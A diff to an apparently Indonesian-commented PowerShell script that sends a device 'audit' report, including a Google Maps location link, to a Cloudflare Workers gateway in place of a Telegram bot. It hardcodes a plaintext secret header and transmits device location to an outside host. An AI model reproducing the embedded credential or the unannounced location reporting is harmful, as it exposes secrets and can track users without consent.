@@ -348,8 +348,18 @@ $Message = "📍 *AUDIT DEVICE REPORT*`n" +
            "━━━━━━━━━━━━━━━━━━`n" +
            "🔗 [GMAPS - Device Location]($MapsLink)"
 
-# --- PENGIRIMAN ---
+# PAKSA konversi string laporan menjadi Byte Array berbasis UTF-8 murni
+$utf8Bytes = [System.Text.Encoding]::UTF8.GetBytes($Message)
+
+# Kirim ke Cloudflare Gateway menggunakan header keamanan kustom Anda
+$urlGateway = "https://win-audit-gateway.addohika.workers.dev"
+$headers = @{
+    "X-Audit-Signature" = "WinAuditS3cretPassw0rd2026"
+}
+
 try {
-    $Payload = @{ chat_id = $TelegramChatID; text = $Message; parse_mode = "Markdown" }
-    Invoke-RestMethod -Uri "https://api.telegram.org/bot$($TelegramToken)/sendMessage" -Method Post -Body $Payload -TimeoutSec 10
-} catch {}
+    # Kirim payload dalam bentuk byte array ($utf8Bytes), bukan string mentah
+    Invoke-RestMethod -Uri $urlGateway -Method Post -Headers $headers -Body $utf8Bytes -ContentType "application/octet-stream"
+} catch {
+    Write-Warning "Gagal mengirim laporan: $_"
+}
